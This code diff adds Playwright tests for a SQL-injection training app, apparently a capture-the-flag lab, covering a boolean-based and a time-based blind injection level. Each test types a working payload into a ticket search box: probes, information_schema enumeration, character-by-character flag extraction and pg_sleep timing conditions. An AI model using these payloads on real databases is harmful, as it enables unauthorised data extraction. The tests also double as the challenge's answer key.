@@ -86,6 +86,114 @@ test.describe('Level 1-3: UNION-Based DB Enumeration', () => {
   })
 })
 
+test.describe('Level 2-1: Boolean-Based Blind SQLi', () => {
+  test.beforeEach(async ({ page }) => {
+    await page.goto('/tickets')
+  })
+
+  test('step 1a - true condition returns available (injection confirmed)', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND 1=1--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-available')).toBeVisible()
+  })
+
+  test('step 1b - false condition returns unavailable (injection confirmed)', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND 1=2--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-unavailable')).toBeVisible()
+  })
+
+  test('step 2a - count of public tables is 2', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')=2--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-available')).toBeVisible()
+  })
+
+  test('step 2b - first character of first table name is b', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0)='b'--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-available')).toBeVisible()
+  })
+
+  test('step 3 - flag length is 27', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND (SELECT LENGTH(juice) FROM unsuspecting_table WHERE id=1)=27--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-available')).toBeVisible()
+  })
+
+  test('step 4a - first character of flag is J', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND (SELECT SUBSTRING(juice,1,1) FROM unsuspecting_table WHERE id=1)='J'--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-available')).toBeVisible()
+  })
+
+  test('step 4b - second character of flag is U', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND (SELECT SUBSTRING(juice,2,1) FROM unsuspecting_table WHERE id=1)='U'--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-available')).toBeVisible()
+  })
+
+  test('congrats banner appears on last character confirmation', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND (SELECT SUBSTRING(juice,27,1) FROM unsuspecting_table WHERE id=1)='}'--")
+    await page.click('.search-btn')
+    await expect(page.locator('.congrats-21')).toBeVisible()
+  })
+})
+
+test.describe('Level 2-2: Time-Based Blind SQLi', () => {
+  const SLEEP_THRESHOLD = 2500
+
+  test.beforeEach(async ({ page }) => {
+    await page.goto('/tickets')
+  })
+
+  test('confirm timing injection - unconditional sleep causes delay', async ({ page }) => {
+    const start = Date.now()
+    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(3))a)--")
+    await page.click('.search-btn')
+    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
+    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
+  })
+
+  test('step 2 - table unsuspecting_table exists (3s delay)', async ({ page }) => {
+    const start = Date.now()
+    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='unsuspecting_table')=1 THEN 3 ELSE 0 END))a)--")
+    await page.click('.search-btn')
+    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
+    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
+  })
+
+  test('step 3 - flag length is 27 (3s delay)', async ({ page }) => {
+    const start = Date.now()
+    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT LENGTH(juice) FROM unsuspecting_table WHERE id=1)=27 THEN 3 ELSE 0 END))a)--")
+    await page.click('.search-btn')
+    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
+    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
+  })
+
+  test('step 4a - first character of flag is J (3s delay)', async ({ page }) => {
+    const start = Date.now()
+    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT SUBSTRING(juice,1,1) FROM unsuspecting_table WHERE id=1)='J' THEN 3 ELSE 0 END))a)--")
+    await page.click('.search-btn')
+    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
+    expect(Date.now() - start).toBeGreaterThanOrEqual(SLEEP_THRESHOLD)
+  })
+
+  test('step 4b - wrong character causes no delay', async ({ page }) => {
+    const start = Date.now()
+    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT SUBSTRING(juice,1,1) FROM unsuspecting_table WHERE id=1)='X' THEN 3 ELSE 0 END))a)--")
+    await page.click('.search-btn')
+    await page.waitForSelector('.result-available, .result-unavailable, .result-error')
+    expect(Date.now() - start).toBeLessThan(SLEEP_THRESHOLD)
+  })
+
+  test('congrats banner appears on last character confirmation with timing', async ({ page }) => {
+    await page.fill('.search-bar input', "A1' AND 1=(SELECT 1 FROM (SELECT pg_sleep(CASE WHEN (SELECT SUBSTRING(juice,27,1) FROM unsuspecting_table WHERE id=1)='}' THEN 3 ELSE 0 END))a)--")
+    await page.click('.search-btn')
+    await expect(page.locator('.congrats-22')).toBeVisible({ timeout: 10000 })
+  })
+})
+
 test.describe('Level 1-4: Error-Based Data Extraction', () => {
   test.beforeEach(async ({ page }) => {
     await page.goto('/login')
